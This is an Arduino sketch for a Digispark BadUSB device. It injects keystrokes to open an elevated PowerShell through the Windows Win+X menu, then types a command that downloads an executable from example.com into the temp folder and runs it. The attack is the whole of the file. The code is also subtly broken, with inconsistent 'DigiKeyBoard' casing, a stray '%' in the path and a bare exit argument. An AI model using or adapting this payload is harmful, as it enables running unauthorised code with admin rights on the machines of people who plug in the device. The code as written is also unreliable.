#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_A);
   DigiKeyboard.delay(300);
   DigiKeyBoard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.delay(300);
   DigiKeyBoard.sendKeyStroke(KEY_ENTER);
   DigiKeyBoard.println("wget \"example.com/badusb.exe\" -outfile \"$env:temp/badusb.exe\"; Start-Process \"$env:temp%/badusb.exe\"; exit;");
   DigiKeyBoard.println(exit);
   blinkLED();
}

void blinkLED(){
  byte brightness = 0;
  byte inc = 15; 
  while(1){
    brightness += inc;
    if(brightness <= 0 || brightness >= 75)
      inc = -inc;
    delay(50);
  }
}

